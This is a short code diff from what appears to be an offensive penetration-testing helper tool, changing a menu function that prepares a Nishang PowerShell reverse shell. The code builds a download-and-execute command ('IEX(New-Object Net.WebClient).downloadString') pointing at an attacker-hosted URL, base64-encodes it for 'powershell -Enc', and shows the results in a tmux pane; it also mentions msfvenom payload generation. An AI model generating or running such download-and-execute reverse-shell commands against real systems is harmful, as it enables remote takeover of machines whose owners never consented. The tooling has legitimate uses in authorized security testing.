@@ -204,13 +204,19 @@ def nishang_shell_menu():
         filename = copy_nishang(ip, rev_shell_port, directory, nishang_script)
         url = f"http://{ip}:{port}/{filename}"
         if int(port) == 80: url = f'http://{ip}/{filename}'
-        print(f"Nishang URL: {url}")
+
         pscommand = f"IEX(New-Object Net.WebClient).downloadString('{url}')"
-        print(f"Commnad: powershell -c \"{pscommand}\"")
         utf16 = pscommand.encode('utf-16le')
-        b = base64.b64encode(utf16).decode('latin1')
-        print(f"Encoded: powershell -Enc {b}")
-        input('Press any key to continue')
+        base64enc = base64.b64encode(utf16).decode('latin1')
+        temp = os.popen('mktemp').read().strip('\n')
+        pane = select_pane()
+        f = open(temp, 'w')
+        f.write(f"""Nishang URL: {url}
+Command: powershell -c "{pscommand}"
+Encoded: powershell -Enc {base64enc}
+        """)
+        f.close()
+        os.system(f"tmux split-window -v 'less {temp} && rm {temp}'")
 
 def msfvenom_generate_menu(ip, directory):
     # select windows/linux
